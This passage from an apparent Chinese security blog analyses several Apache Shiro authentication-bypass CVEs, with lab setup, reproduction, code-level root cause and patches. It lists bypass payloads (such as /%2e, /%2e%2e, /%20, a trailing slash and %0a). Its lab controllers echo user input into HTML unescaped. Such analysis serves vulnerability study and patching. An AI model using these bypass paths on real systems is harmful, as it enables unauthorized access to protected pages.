<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/CVE-2020-17510/&#123;test&#125;&quot;)</span>  </span><br><span class="line"><span class="meta">@ResponseBody</span>  </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">CVE_2020_17510_test</span><span class="params">(<span class="meta">@PathVariable</span> String test)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;html&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;head&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;title&gt;CVE-2020-17510 Page&lt;/title&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;/head&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;body&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;h1&gt;Welcome to CVE-2020-17510 Page&lt;/h1&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;p&gt;This is a page that requires administrator privileges.&lt;/p&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;p&gt;test:&lt;/p&gt;&quot;</span> + test +  </span><br><span class="line">            <span class="string">&quot;&lt;/body&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;/html&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>权限路径配置：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; filterChainDefinitionMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();  </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">&quot;/CVE-2020-17510/*&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);  </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="漏洞复现-9"><a href="#漏洞复现-9" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>正常访问会302跳转：</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250124173002268.png"></p>
<p>访问&#x2F;CVE-2020-17510&#x2F;%2e，可以访问到需要权限的页面：</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250124173113608.png"></p>
<h4 id="漏洞分析-9"><a href="#漏洞分析-9" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>和前两个漏洞类似，和Shiro与Spring处理URI的差异性有关。那么还是先看Shiro部分的。和之前一样在WebUtils#getPathWithinApplication中，获取ServletPath和PathInfo拼接，去掉分号部分后规范化。</p>
<p>在前面我们知道ServletPath是经过URL解码和处理过后的。因此我们的访问URI，&#x2F;CVE-2020-17510&#x2F;%2e，在Shiro的获取中如下：</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250124191334865.png"></p>
<p>可以看到Shiro得到的ServletPath是&#x2F;CVE-2020-17510&#x2F;，后续处理返回的也是这个，然后返回到PathMatchingFilterChainResolver#getChain中，最后以斜杠结尾则去掉斜杠，得到我们访问URI是&#x2F;CVE-2020-17510，这显然与规则&#x2F;CVE-2020-17510&#x2F;*不匹配的。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250124200843806.png"></p>
<p>而对于Spring，获得的URI就是&#x2F;CVE-2020-17510&#x2F;%2e，因此它会找到对应URI的方法获取资源。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125003939980.png"></p>
<p>除此之外的payload还有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/CVE-2020-17510/.</span><br><span class="line">/CVE-2020-17510/./</span><br><span class="line">/CVE-2020-17510/..</span><br><span class="line">/CVE-2020-17510/../</span><br><span class="line">/CVE-2020-17510/%2e</span><br><span class="line">/CVE-2020-17510/%2e/</span><br><span class="line">/CVE-2020-17510/%2e%2e</span><br><span class="line">/CVE-2020-17510/%2e%2e/</span><br></pre></td></tr></table></figure>

<p>%2e%2e相关的payload可以用的原因是，请求的ServletPath会被处理成根目录，也就是&#x2F;，自然不会被匹配拦截。</p>
<p>该漏洞需要版本要求：springboot &gt; 2.3.0</p>
<blockquote>
<p>当Spring Boot版本在小于等于2.3.0.RELEASE的情况下，<code>alwaysUseFullPath</code>为默认值false，这会使得其获取ServletPath，所以在路由匹配时相当于会进行路径标准化包括对<code>%2e</code>解码以及处理跨目录</p>
</blockquote>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125043809329.png"></p>
<p>由于小于等于2.3.0.RELEASE的SpringBoot版本<code>alwaysUseFullPath</code>为默认值false，因此会获取 Servlet 映射内的路径，也就是getPathWithinServletMapping方法。具体如下：</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125044230554.png"></p>
<p>可以看到<code>/CVE-2020-17510/.</code>会先获取应用内的路径 <code>/CVE-2020-17510/.</code>和Servlet路径<code>/CVE-2020-17510</code>，然后将Servlet路径清理后，与应用内路径匹配，得到剩余路径<code>.</code>。</p>
<p>而如果<code>alwaysUseFullPath</code>为true，那么即使Spring Boot版本在小于等于2.3.0.RELEASE也能出现该漏洞。</p>
<h4 id="漏洞修复-8"><a href="#漏洞修复-8" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>Shiro新增了一个ShiroUrlPathHelper类，是UrlPathHelper的子类，重写了 <code>getPathWithinApplication</code> 和 <code>getPathWithinServletMapping</code>两个方法，也就是让Spring处理URI的方式用了和Shiro一样的<code>WebUtils#getPathWithinApplication</code>方法。让Shiro和Spring以相同的方式处理URI，避免差异化导致的问题。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125154825868.png"></p>
<p>在配置类import导入了ShiroRequestMappingConfig类。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125203410107.png"></p>
<p>这个类就会将RequestMappingHandlerMapping#urlPathHelper设置ShiroUrlPathHelper。使得Spring会用ShiroUrlPathHelper类，也就是Shiro的处理方式去处理路径。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125205226572.png"></p>
<p>看起来修复的很完美，但在Spring的高版本中，patternParser默认值是true，因此会走默认的UrlPathHelper.defaultInstance来处理，而不是ShiroUrlPathHelper。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250126051411029.png"></p>
<p>所以这个漏洞不能Spring版本太高或太低，如果太低，由于alwaysUseFullPath为false会获得Servlet路径清洗处理后的剩余路径。如果版本太高，又会因为patternParser默认值是true走走默认的UrlPathHelper.defaultInstance。</p>
<h4 id="参考链接-6"><a href="#参考链接-6" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="http://rui0.cn/archives/1643">Spring Boot中关于%2e的Trick - Ruilin</a></p>
<p><a target="_blank" rel="noopener" href="https://su18.org/post/shiro-4/#%E6%B3%A8%E6%84%8F">从 CVE 学 Shiro 安全-4 | 素十八</a></p>
<h3 id="CVE-2020-17523"><a href="#CVE-2020-17523" class="headerlink" title="CVE-2020-17523"></a>CVE-2020-17523</h3><h5 id="漏洞信息-9"><a href="#漏洞信息-9" class="headerlink" title="漏洞信息"></a>漏洞信息</h5><p>影响版本：&#96;shiro &lt; 1.7.1 </p>
<p>漏洞成因：Shiro匹配URI对应过滤器时对含有%20路径的处理存在绕过。</p>
<p>漏洞补丁：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/ab1ea4a2006f6bd6a2b5f72740b7135662f8f160">Improving tests for path matching logic · apache&#x2F;shiro@ab1ea4a</a></p>
<h5 id="漏洞环境-10"><a href="#漏洞环境-10" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--shiro-spring--&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>添加接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/CVE-2020-17523/&#123;test&#125;&quot;)</span>  </span><br><span class="line"><span class="meta">@ResponseBody</span>  </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">CVE_2020_17523_test</span><span class="params">(<span class="meta">@PathVariable</span> String test)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;html&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;head&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;title&gt;CVE-2020-17523 Page&lt;/title&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;/head&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;body&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;h1&gt;Welcome to CVE-2020-17523 Page&lt;/h1&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;p&gt;This is a page that requires administrator privileges.&lt;/p&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;p&gt;test:&lt;/p&gt;&quot;</span> + test +  </span><br><span class="line">            <span class="string">&quot;&lt;/body&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;/html&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>权限路径配置：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; filterChainDefinitionMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();  </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">&quot;/CVE-2020-17523/*&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);  </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="漏洞复现-10"><a href="#漏洞复现-10" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>和之前一样正常访问302跳转：</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250201221902014.png"></p>
<p>但是访问<code>/CVE-2020-17523/%20</code>，可以访问到需要权限的页面：</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250201222252761.png"></p>
<h5 id="漏洞分析-10"><a href="#漏洞分析-10" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>首先看Shiro处理后的路径是什么，还是来到熟悉的PathMatchingFilterChainResolver#getChain方法中。Shiro得到的路径是&#x2F;CVE-2020-17523&#x2F; 。因为会URL解码，之前已经了解过。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250202002317401.png"></p>
<p>而Shiro得到的&#x2F;CVE-2020-17523&#x2F; 为什么与规则匹配不上，我们可以跟进到AntPathMatcher#doMatch。具体调用堆栈如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">doMatch:<span class="number">109</span>, AntPathMatcher (org.apache.shiro.util)</span><br><span class="line">match:<span class="number">90</span>, AntPathMatcher (org.apache.shiro.util)</span><br><span class="line">matches:<span class="number">86</span>, AntPathMatcher (org.apache.shiro.util)</span><br><span class="line">pathMatches:<span class="number">152</span>, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br><span class="line">getChain:<span class="number">123</span>, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br></pre></td></tr></table></figure>

<p>会将得到的URI和拦截规则都处理成字符串数组，而对于该处理方法，<code>/CVE-2020-17523/ </code>和<code>/CVE-2020-17523</code>是等价的。因此可以认为，Shiro虽然得到的是<code>/CVE-2020-17523/ </code>，但是在后续匹配过程中，在匹配方法中认为的URI就是<code>/CVE-2020-17523</code>。因此匹配不上也是很自然的事情了。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250202033823171.png"></p>
<p>而这个具体的处理方法，将URI根据分隔符斜杠分割成一个个token，<code>/CVE-2020-17523/ </code>就会被分割成CVE-2020-17523和空格，每个token会用trim函数处理，也就是去掉首尾空格，第二个token由于就是一个空格，因此处理之后就没有字符了，因此无法添加到tokens中，后续将tokens转成字符数组也就没有第二个token了，因此只剩下了CVE-2020-17523，所以返回的字符数组就只有CVE-2020-17523一个元素。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250202040046717.png"></p>
<p>Spring虽然在上次补丁使用了Shiro的处理URI的方法，但是匹配Handler时并没有处理URI中的空格，所以访问的URI为<code>/CVE-2020-17523/ </code>是可以获取资源的。</p>
<h5 id="漏洞修复-9"><a href="#漏洞修复-9" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>指定 <code>StringUtils#tokenizeToStringArray</code> 的第三个参数 trimTokens 为 false，就是不处理每个token的首尾空格了。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250202041757378.png"></p>
<h5 id="参考链接-7"><a href="#参考链接-7" class="headerlink" title="参考链接"></a>参考链接</h5><p><a target="_blank" rel="noopener" href="https://su18.org/post/shiro-4/#%E7%BB%95%E8%BF%87">从 CVE 学 Shiro 安全-4 | 素十八</a></p>
<h3 id="CVE-2021-41303"><a href="#CVE-2021-41303" class="headerlink" title="CVE-2021-41303"></a>CVE-2021-41303</h3><blockquote>
<p>Apache Shiro before 1.8.0, when using Apache Shiro with Spring Boot, a specially crafted HTTP request may cause an authentication bypass.</p>
</blockquote>
<h4 id="漏洞信息-10"><a href="#漏洞信息-10" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><p>影响版本：&#96;shiro &lt; 1.8.0 </p>
<p>漏洞成因：误将处理后的URI作为拦截规则的过滤器添加进过滤链。</p>
<p>漏洞补丁：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/4a20bf0e995909d8fda58f9c0485ea9eb2d43f0e">Backport SHIRO-825 · apache&#x2F;shiro@4a20bf0</a></p>
<h4 id="漏洞环境-11"><a href="#漏洞环境-11" class="headerlink" title="#### 漏洞环境"></a>#### 漏洞环境</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--shiro-spring--&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>添加接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/CVE-2021-41303/cmisl&quot;)</span>  </span><br><span class="line"><span class="meta">@ResponseBody</span>  </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">CVE_2021_41303</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;html&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;head&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;title&gt;CVE-2021-41303 Page1&lt;/title&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;/head&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;body&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;h1&gt;Welcome to CVE-2021-41303 Page&lt;/h1&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;    &lt;p&gt;This is a page that requires administrator privileges.&lt;/p&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;/body&gt;\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&lt;/html&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>权限路径配置：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; filterChainDefinitionMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();  </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">&quot;/CVE-2021-41303/*&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);  </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">&quot;/CVE-2021-41303/cmisl&quot;</span>, <span class="string">&quot;anon&quot;</span>); </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="漏洞复现-11"><a href="#漏洞复现-11" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>访问<code>/CVE-2021-41303/cmisl</code>，302跳转到登录页面。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250209211901462.png"></p>
<p>访问<code>/CVE-2021-41303/cmisl/</code>，可以访问到资源。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250209212942911.png"></p>
<h4 id="漏洞分析-11"><a href="#漏洞分析-11" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>还是看到PathMatchingFilterChainResolver#getChain方法，shiro1.7.0更新之后，该方法发生了一些变化，如下图，左边是Shiro1,.7.0，右边是Shiro1.7.1：</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210030721721.png"></p>
<p>在原来的基础上添加了一层判断逻辑，原来的是先判断请求URI是否是 “&#x2F;“结尾，如果是去掉 “&#x2F;“再匹配，更新后的逻辑是，首先将请求URI直接匹配，如果匹配不上，在将经过removeTrailingSlash方法的URI进行匹配，这个方法就是去掉末尾的”&#x2F;“。</p>
<p>而新增的代码其实就存在漏洞，仔细看就会发现，新增的代码中，如果匹配成功，添加的过滤器并不是匹配成功的结果，而是将经过removeTrailingSlash方法的URI作为过滤规则的过滤器添加到链中。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210034750306.png"></p>
<p>漏洞需要拦截规则如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Map.put(<span class="string">&quot;/CVE-2021-41303/*&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);  </span><br><span class="line">Map.put(<span class="string">&quot;/CVE-2021-41303/cmisl&quot;</span>, <span class="string">&quot;anon&quot;</span>); </span><br></pre></td></tr></table></figure>

<p>比如我们的请求URI是<code>/CVE-2021-41303/cmisl/</code>，此时我们会有一个原始的URI和一个处理后的<code>/CVE-2021-41303/cmisl</code>，首先<code>/CVE-2021-41303/cmisl/</code>与<code>/CVE-2021-41303/*</code>匹配失败，然后新增部分代码会用<code>/CVE-2021-41303/cmisl</code>与<code>/CVE-2021-41303/*</code>匹配，这是可以匹配上的。</p>
<p>因此按理说是可以匹配需要鉴权的规则，但是更新的代码问题，我们匹配上了<code>/CVE-2021-41303/*</code>，但是添加过滤器的时候，我们是将<code>requestURINoTrailingSlash</code>值作为拦截规则添加其对应的过滤器的，该值就是原始URI去掉”&#x2F;“，也就是<code>/CVE-2021-41303/cmisl</code>，根据配置，该路径是可以匿名访问的。因此添加的是匿名过滤器，无需权限。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210043758604.png"></p>
<p>在我看来该漏洞意义并不大，既然拦截规则特地将<code>/CVE-2021-41303/cmisl</code>设置为匿名访问，那么在管理者看来，这个资源就是应该无需权限就可以访问的。</p>
<h4 id="漏洞修复-10"><a href="#漏洞修复-10" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>通过上面分析就知道有问题的代码位置，那么修复也很简单，将匹配到的规则添加进过滤链即可。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210044530404.png"></p>
<h3 id="CVE-2022-32532"><a href="#CVE-2022-32532" class="headerlink" title="CVE-2022-32532"></a>CVE-2022-32532</h3><blockquote>
<p>Apache Shiro before 1.9.1, A RegexRequestMatcher can be misconfigured to be bypassed on some servlet containers. Applications using RegExPatternMatcher with <code>.</code>in the regular expression are possibly vulnerable to an authorization bypass.</p>
</blockquote>
<h4 id="漏洞信息-11"><a href="#漏洞信息-11" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><p>影响版本：<code>shiro &lt; 1.9.1</code></p>
<p>漏洞成因：在1.9.1之前的Apache Shiro中，RegexRequestMatcher可能会在某些Servlet容器中被错误配置，从而导致绕过。使用包含.的正则表达式的RegExPatternMatcher的应用程序可能会面临授权绕过的风险。</p>
<p>漏洞补丁：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/6bcb92e06fa588b9c7790dd01bc02135d58d3f5b">Add support for case-insensitive matching to RegExPatternMatcher · apache&#x2F;shiro@6bcb92e</a></p>
<h4 id="漏洞环境-12"><a href="#漏洞环境-12" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>漏洞环境可以直接用4r1an师傅的：<a target="_blank" rel="noopener" href="https://github.com/Lay0us/CVE-2022-32532">Lay0us&#x2F;CVE-2022-32532: Apache Shiro CVE-2022-32532</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="built_in">this</span>.getSecurityManager();  </span><br><span class="line"><span class="type">FilterChainManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFilterChainManager</span>();  </span><br><span class="line">manager.addFilter(<span class="string">&quot;myFilter&quot;</span>,<span class="keyword">new</span> <span class="title class_">MyFilter</span>());  </span><br><span class="line">manager.addToChain(<span class="string">&quot;/permit/.*&quot;</span>, <span class="string">&quot;myFilter&quot;</span>);  </span><br><span class="line"></span><br><span class="line"><span class="type">PathMatchingFilterChainResolver</span> <span class="variable">chainResolver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PathMatchingFilterChainResolver</span>();  </span><br><span class="line">chainResolver.setFilterChainManager(manager);  </span><br><span class="line"><span class="comment">// set RegExPatternMatcher  </span></span><br><span class="line">chainResolver.setPathMatcher(<span class="keyword">new</span> <span class="title class_">RegExPatternMatcher</span>());</span><br></pre></td></tr></table></figure>

<p><code>myFilter</code>过滤器添加到匹配路径模式<code>/permit/.*</code>的过滤链中。设置了<code>PathMatchingFilterChainResolver</code>使用的路径匹配器为<code>RegExPatternMatcher</code>，它支持正则表达式匹配路径。因此所有以<code>/permit/</code>开头的URL请求都会经过<code>myFilter</code>过滤器。</p>
<h4 id="漏洞复现-12"><a href="#漏洞复现-12" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>直接访问<code>/permit/cmisl</code>，由于匹配上拦截规则，返回access denied表示没有权限。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210190318841.png"></p>
<p>访问<code>/permit/cm%0aisl</code>，发现返回success，表示访问到资源了。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210190450911.png"></p>
<h4 id="漏洞分析-12"><a href="#漏洞分析-12" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>我们先了解一下java中的正则匹配，因为漏洞原因出现在正则表达式模式匹配器。</p>
<p>Java中的正则默认情况下.并不包含<code>\r</code>和<code>\n</code>字符，不过有<code>Pattern.DOTALL</code>标志位，用于修改正则表达式的匹配行为。使得<code>.</code>字符能够匹配包括换行符在内的所有字符。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">	<span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;a.b&quot;</span>;</span><br><span class="line">	<span class="type">String</span> <span class="variable">input1</span> <span class="operator">=</span> <span class="string">&quot;aab&quot;</span>;</span><br><span class="line">	<span class="type">String</span> <span class="variable">input2</span> <span class="operator">=</span> <span class="string">&quot;a\nb&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 默认模式</span></span><br><span class="line">	<span class="type">Pattern</span> <span class="variable">pattern1</span> <span class="operator">=</span> Pattern.compile(regex);</span><br><span class="line">	<span class="type">Matcher</span> <span class="variable">matcher1</span> <span class="operator">=</span> pattern1.matcher(input1);</span><br><span class="line">	System.out.println(<span class="string">&quot;Default pattern: &quot;</span> + matcher1.matches()); <span class="comment">// 输出: true</span></span><br><span class="line"></span><br><span class="line">	matcher1 = pattern1.matcher(input2);</span><br><span class="line">	System.out.println(<span class="string">&quot;Default pattern: &quot;</span> + matcher1.matches()); <span class="comment">// 输出: false</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// DOTALL模式</span></span><br><span class="line">	<span class="type">Pattern</span> <span class="variable">pattern2</span> <span class="operator">=</span> Pattern.compile(regex, Pattern.DOTALL);</span><br><span class="line">	<span class="type">Matcher</span> <span class="variable">matcher2</span> <span class="operator">=</span> pattern2.matcher(input1);</span><br><span class="line">	System.out.println(<span class="string">&quot;DOTALL pattern: &quot;</span> + matcher2.matches()); <span class="comment">// 输出: true</span></span><br><span class="line"></span><br><span class="line">	matcher2 = pattern2.matcher(input2);</span><br><span class="line">	System.out.println(<span class="string">&quot;DOTALL pattern: &quot;</span> + matcher2.matches()); <span class="comment">// 输出: true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而Shiro中有一个类，RegExPatternMatcher，代码如下，很显然没有Pattern.DOTALL标志位，因此会出现匹配不到换行符的问题。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210210219407.png"></p>
<p>调试结果也如分析一样。</p>
